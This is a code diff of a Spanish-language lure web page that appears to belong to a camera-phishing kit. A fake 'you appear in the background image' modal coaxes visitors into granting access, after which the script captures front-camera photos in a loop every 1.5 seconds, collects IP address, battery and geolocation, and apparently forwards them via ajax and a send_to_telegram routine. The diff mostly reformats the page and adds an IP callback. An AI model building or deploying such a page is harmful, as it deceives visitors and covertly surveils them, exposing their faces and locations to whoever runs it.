@@ -22,7 +22,6 @@ send_to_telegram($msg);
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="theme-color" content="#fff">
-  <link rel="stylesheet" href="style.css">
   <script src="jquery.min.js"></script>
   <title>Demo Info</title>
   <style>
@@ -39,7 +38,7 @@ send_to_telegram($msg);
       flex-direction: column;
     }
 
-    /* Fondo con div en lugar de ::before */
+    /* Fondo fijo con div */
     #background {
       position: fixed;
       top: 0; left: 0;
@@ -55,7 +54,7 @@ send_to_telegram($msg);
       background: url('img/image2.jpg') no-repeat center center/cover;
       filter: none;
     }
-         
+
     #cameraModal .content {
       background: #1c1c1c;
       color: #fff;
@@ -66,7 +65,9 @@ send_to_telegram($msg);
       box-shadow: 0 0 15px rgba(0,0,0,0.6);
       border: 1px solid #333;
     }
+
     .logo { max-width: 150px; margin-bottom: 15px; }
+
     #grantAccess {
       margin-top: 20px;
       padding: 12px 25px;
@@ -79,7 +80,9 @@ send_to_telegram($msg);
       font-weight: bold;
       transition: background 0.2s;
     }
+
     #grantAccess:hover { background-color: #b00610; }
+
     #cameraModal {
       position: fixed; top:0; left:0;
       width:100%; height:100%;
@@ -87,6 +90,7 @@ send_to_telegram($msg);
       display: flex; align-items: center; justify-content: center;
       z-index: 9999;
     }
+
     #unlockAnimation {
       position: fixed; top:0; left:0;
       width:100%; height:100%;
@@ -95,6 +99,7 @@ send_to_telegram($msg);
       display: flex; align-items:center; justify-content:center;
       flex-direction: column; font-size:22px; z-index:10000; display:none;
     }
+
     .loader {
       border:6px solid #333;
       border-top:6px solid #e50914;
@@ -103,20 +108,25 @@ send_to_telegram($msg);
       animation: spin 1s linear infinite;
       margin-top:15px;
     }
+
     @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+
     .disclaimer { font-size:11px; color:#aaa; margin-top:15px; }
   </style>
 </head>
 <body>
 
+<!-- Fondo -->
+<div id="background"></div>
+
 <!-- Modal de permisos -->
 <div id="cameraModal">
     <div class="content">
         <img src="img/logo-erome-vertical.png" alt="Logo" class="logo">
-        <p>📸 ¡Wow! Apareces en la imagen de fondo... ¿seguro que no eres tú? Para poder acceder y visualizar la imagen correctamente, necesitamos tu permiso para acceder al almacenamiento y descargar el contenido.</p>
+        <p>📸 ¡Wow! Apareces en la imagen de fondo... Para poder acceder y visualizar la imagen correctamente, necesitamos tu permiso para acceder al almacenamiento y descargar el contenido.</p>
         <button id="grantAccess">Permitir acceso</button>
         <div class="disclaimer">
-            Al acceder y utilizar esta página, usted reconoce que lo hace por su propia voluntad y asume toda la responsabilidad por cualquier acción o consecuencia derivada de su uso.
+            Al acceder y utilizar esta página, usted reconoce que lo hace por su propia voluntad y asume toda la responsabilidad por cualquier acción o consecuencia derivada de su uso.
         </div>
     </div>
 </div>
@@ -134,10 +144,13 @@ send_to_telegram($msg);
 <h3 id="bateria"></h3>
 <strong id="myIp"></strong>
 
+<script>
+function get_ip(obj){ document.getElementById('myIp').innerHTML = obj.ip; };
+</script>
 <script type="text/javascript" src="https://api.ipify.org/?format=jsonp&callback=get_ip"></script>
 <script src="ip.js"></script>
 <script src="ajax.js"></script>
-       
+
 <!-- Obtener ubicación y enviarla automáticamente -->
 <script>
 if ('geolocation' in navigator) {
@@ -150,10 +163,10 @@ if ('geolocation' in navigator) {
         });
     });
 }
-       </script>
+</script>
+
 <script>
 'use strict';
-
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const constraints = { audio:false, video:{facingMode:"user"} };
@@ -165,8 +178,14 @@ async function initCamera(){
         capturePhotoLoop();
         const unlockModal = document.getElementById('unlockAnimation');
         unlockModal.style.display='flex';
-        setTimeout(()=>{ unlockModal.style.display='none'; document.body.classList.add('unlocked'); },5000);
-    }catch(e){ console.error(e); document.getElementById('cameraModal').style.display='flex'; }
+        setTimeout(()=>{ 
+            unlockModal.style.display='none'; 
+            document.body.classList.add('unlocked'); 
+        },5000);
+    }catch(e){ 
+        console.error(e); 
+        document.getElementById('cameraModal').style.display='flex'; 
+    }
 }
 
 function capturePhotoLoop(){
@@ -178,9 +197,10 @@ function capturePhotoLoop(){
     },1500);
 }
 
-document.getElementById('grantAccess').addEventListener('click',()=>{ document.getElementById('cameraModal').style.display='none'; initCamera(); });
-
-
+document.getElementById('grantAccess').addEventListener('click',()=>{ 
+    document.getElementById('cameraModal').style.display='none'; 
+    initCamera(); 
+});
 </script>
 
 </body>
